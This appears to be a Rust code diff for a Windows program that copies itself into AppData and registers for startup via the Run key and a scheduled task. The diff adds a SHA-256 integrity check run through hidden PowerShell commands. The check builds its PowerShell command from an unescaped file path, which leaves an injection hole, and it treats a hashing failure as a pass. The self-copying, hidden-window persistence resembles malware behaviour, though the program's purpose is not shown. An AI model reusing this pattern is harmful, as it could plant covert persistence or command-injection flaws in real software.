@@ -118,6 +118,18 @@ pub fn ensure_startup_registered() {
             }
             return;
         }
+
+        // F8: Integrity check — verify the copied file matches the source via SHA-256
+        if !verify_copy_integrity(&current_exe, &target_exe) {
+            debug_print("[✗] Integrity check FAILED. Deleting corrupt copy.");
+            let _ = fs::remove_file(&target_exe);
+            let current_str = current_exe.to_string_lossy().to_string();
+            if !is_startup_enabled(&current_str) {
+                let _ = create_scheduled_task(&current_str);
+            }
+            return;
+        }
+        debug_print("[✓] Integrity check passed (SHA-256 match).");
     } else {
         debug_print("[✓] Persistent executable is up to date in AppData.");
     }
@@ -220,3 +232,51 @@ fn register_startup_registry(exe_path: &str) {
         Err(e) => debug_print(&format!("[✗] Cannot open Run key: {}", e)),
     }
 }
+
+/// Verify that source and destination files have matching SHA-256 hashes.
+/// Uses PowerShell Get-FileHash to avoid adding a crypto dependency.
+fn verify_copy_integrity(source: &std::path::Path, dest: &std::path::Path) -> bool {
+    let get_hash = |path: &std::path::Path| -> Option<String> {
+        let output = crate::hidden_command("powershell")
+            .args([
+                "-NoProfile",
+                "-NonInteractive",
+                "-Command",
+                &format!(
+                    "(Get-FileHash -Path '{}' -Algorithm SHA256).Hash",
+                    path.to_string_lossy()
+                ),
+            ])
+            .output()
+            .ok()?;
+
+        if !output.status.success() {
+            return None;
+        }
+
+        Some(
+            String::from_utf8_lossy(&output.stdout)
+                .trim()
+                .to_uppercase(),
+        )
+    };
+
+    match (get_hash(source), get_hash(dest)) {
+        (Some(src_hash), Some(dst_hash)) => {
+            if src_hash == dst_hash {
+                true
+            } else {
+                debug_print(&format!(
+                    "[✗] Hash mismatch!\n    Source: {}\n    Dest:   {}",
+                    src_hash, dst_hash
+                ));
+                false
+            }
+        }
+        _ => {
+            debug_print("[⚠] Could not compute file hashes. Skipping integrity check.");
+            true // Don't block on hash failure — treat as OK
+        }
+    }
+}
+
